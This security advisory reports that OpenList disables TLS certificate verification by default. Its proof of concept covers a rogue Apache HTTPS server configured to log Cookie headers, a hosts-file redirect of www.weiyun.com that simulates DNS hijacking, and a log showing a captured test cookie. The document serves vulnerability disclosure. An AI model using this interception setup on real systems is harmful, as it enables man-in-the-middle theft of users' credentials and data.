summary: |
  OpenList has Insecure TLS Default Configuration
  ### Summary
  The application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.

  ### Details
  Certificate verification is disabled by default for all storage driver communications.

  The `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/OpenListTeam/OpenList/blob/5db2172ed681346b69ed468c73c1f01b6ed455ea/internal/conf/config.go#L185).

  ~~~
  func DefaultConfig() *Config {
      // ...
      TlsInsecureSkipVerify: true,
      // ...
  }
  ~~~

  This vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings.

  ### PoC
  We modified the /etc/hostsfile to simulate DNS hijacking and redirect [www.weiyun.com](http://www.weiyun.comto/) to a malicious TLS-enabled HTTP server.

  The purpose of this PoC is to demonstrate that the Openlist server will indeed establish communication with a malicious server due to disabled certificate verification. This allows us to intercept and steal authentication cookies used for communicating with other storage providers.

  #### Setup a malicious https server:
  *ssl.conf*:
  ~~~
  LoadModule ssl_module modules/mod_ssl.so
  LoadModule log_config_module modules/mod_log_config.so

  Listen 443

  LogFormat "%h %l %u %t \"%r\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i" headers
  CustomLog "/usr/local/apache2/logs/headers.log" headers

  <VirtualHost _default_:443>
      DocumentRoot "/usr/local/apache2/htdocs"
      ServerName localhost

      SSLEngine on
      SSLCertificateFile "/usr/local/apache2/conf/server.crt"
      SSLCertificateKeyFile "/usr/local/apache2/conf/server.key"

      ErrorLog "/usr/local/apache2/logs/ssl_error.log"

      <Directory "/usr/local/apache2/htdocs">
          Options Indexes FollowSymLinks
          AllowOverride None
          Require all granted
      </Directory>
  </VirtualHost>
  ~~~

  *Dockerfile*:
  ~~~
  FROM httpd:2.4

  # Copy SSL config
  COPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf

  # Include SSL config in main httpd.conf
  RUN echo "Include conf/extra/ssl.conf" >> /usr/local/apache2/conf/httpd.conf

  # Copy certs
  COPY certs/server.crt /usr/local/apache2/conf/server.crt
  COPY certs/server.key /usr/local/apache2/conf/server.key
  ~~~

  *build-ssh-httpd.sh*
  ~~~bash
  mkdir certs
  openssl req -x509 -nodes -days 365 \
    -newkey rsa:2048 \
    -keyout certs/server.key \
    -out certs/server.crt
  docker build -t httpd-test-ssl .
  ~~~

  *docker-compose.yaml*:
  ~~~
  services:
    openlist:
      restart: always
      volumes:
        - '/etc/openlist:/opt/openlist/data'
      ports:
        - '5244:5244'
        - '5245:5245'
      user: '0:0'
      environment:
        - UMASK=022
        - TZ=Asia/Shanghai
      container_name: openlist
      image: 'openlistteam/openlist:latest'

    evilhttpd:
      image: 'httpd-test-ssl:latest'
  ~~~

  #### Simulate DNS hijacking
  Modify openlist container's /etc/hosts to redirect www.weiyun.com to malicious server:
  ~~~
  <IP of HTTPS Server>      www.weiyun.com
  ~~~

  You can `ping evilhttpd` to obtain its IP.

  #### Trigger
  In the front end, add a weiyun storage and inspect log on tls server:

  ~~~
  root@3c5bbda440c9:/usr/local/apache2# tail -n 1  /usr/local/apache2/logs/headers.log
  172.18.0.2 - - [18/Dec/2025:06:29:48 +0000] "POST /webapp/json/weiyunQdiskClient/DiskUserInfoGet?cmd=2201&g_tk= HTTP/1.1" 404 236 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Macintosh; Apple macOS 15_5) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Chrome/138.0.0.0 Referer:- Accept:- Cookie:test-secret-cookie=
  ~~~

  Note that the cookie in the log.

  ### Impact
  This misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.

  This vulnerability affects all openlist deployment with default TLS configuration.
